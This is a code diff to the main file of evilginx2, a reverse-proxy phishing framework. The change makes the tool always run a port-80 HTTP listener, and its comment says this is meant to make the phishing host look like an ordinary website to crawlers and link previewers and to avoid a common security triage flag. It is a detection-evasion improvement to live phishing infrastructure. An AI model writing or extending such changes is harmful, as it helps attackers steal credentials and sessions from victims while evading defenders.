@@ -12,14 +12,12 @@ import (
 	"strings"
 	"syscall"
 
-
 	"github.com/caddyserver/certmagic"
 	"github.com/fatih/color"
 	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 	"go.uber.org/zap"
-	
 )
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
@@ -231,12 +229,14 @@ func main() {
 		tsPub = cfg.GetTurnstileSiteKey()
 		tsPriv = cfg.GetTurnstileSecretKey()
 	}
-	if tsPub != "" {
-		hs, _ := core.NewHttpServer(tsPub, tsPriv, true)
-		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true)
+	// Always run the plain-HTTP listener on :80. It serves the ACME http-01 challenge
+	// and 302-redirects every http:// request to https://. A live :80 keeps the host
+	// looking like an ordinary website to crawlers/previewers that try HTTP first
+	// (a connection-refused on :80 is a common triage flag).
+	hs, _ := core.NewHttpServer(tsPub, tsPriv, tsPub != "")
+	hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, tsPub != "")
+	if hs != nil {
 		hs.Start(hp)
-	} else {
-		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false)
 	}
 	hp.Start()
 
